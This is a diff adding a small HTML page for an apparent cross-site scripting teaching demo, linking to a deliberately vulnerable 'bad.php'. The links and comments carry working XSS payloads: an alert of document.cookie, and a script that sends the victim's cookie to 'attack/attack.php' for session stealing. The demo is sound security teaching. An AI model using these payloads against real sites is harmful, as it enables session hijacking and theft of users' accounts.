@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="de">
+  <head>
+    <title>XSS Demo</title>
+  </head>
+  <body>
+    <p>Dangerous Links:</p>
+    <ul>
+      <li>
+        <!-- <script>alert(document.cookie)</script> -->
+        <a href="bad.php?xss=<script>alert%28document.cookie%29<%2Fscript>">
+          Reflected XSS
+        </a>
+      </li>
+      <li>
+        <!-- <script>var XMLHTTP = new XMLHttpRequest();var url = 'attack/attack.php?cookie=';XMLHTTP.open('GET', url.concat(document.cookie), true);XMLHTTP.send(null);</script> -->
+        <a
+          href="bad.php?xss=<script>var+XMLHTTP+%3D+new+XMLHttpRequest%28%29%3Bvar+url+%3D+%27attack%2Fattack.php%3Fcookie%3D%27%3BXMLHTTP.open%28%27GET%27%2C+url.concat%28document.cookie%29%2C+true%29%3BXMLHTTP.send%28null%29%3B<%2Fscript>"
+        >
+          XXS with Session Stealing
+        </a>
+      </li>
+    </ul>
+
+    <hr />
+
+    <p>Sites:</p>
+    <ul>
+      <li>
+        <a href="bad.php">bad.php</a>
+      </li>
+      <li>
+        <a href="clean.php">clean.php</a>
+      </li>
+    </ul>
+  </body>
+</html>
